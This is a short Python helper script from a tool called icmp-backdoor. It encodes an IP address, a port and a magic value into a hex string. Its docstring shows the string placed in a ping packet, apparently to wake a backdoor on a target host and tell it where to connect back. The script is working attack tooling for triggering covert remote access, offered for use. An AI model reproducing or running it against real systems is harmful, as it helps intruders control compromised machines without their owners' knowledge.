#!/usr/bin/env python3

"""calc.py - Calculate hex string for use with icmp-backdoor
   by Daniel Roberson @dmfroberson 10/2018

   usage: ping -c 1 -p $(./calc.py 10.10.10.10 4096) host

   TODO: validate magic. should be 4 bytes of hexadecimal characters
"""

import os
import sys
import socket

try:
    ip_address = sys.argv[1]
    port = sys.argv[2]
    magic = "2a7e" if len(sys.argv) != 4 else sys.argv[3]
except IndexError:
    print("usage: %s <ip address> <port> [magic]")
    exit(os.EX_USAGE)

print(socket.inet_aton(ip_address).hex() + hex(int(port))[2:].zfill(4) + magic)

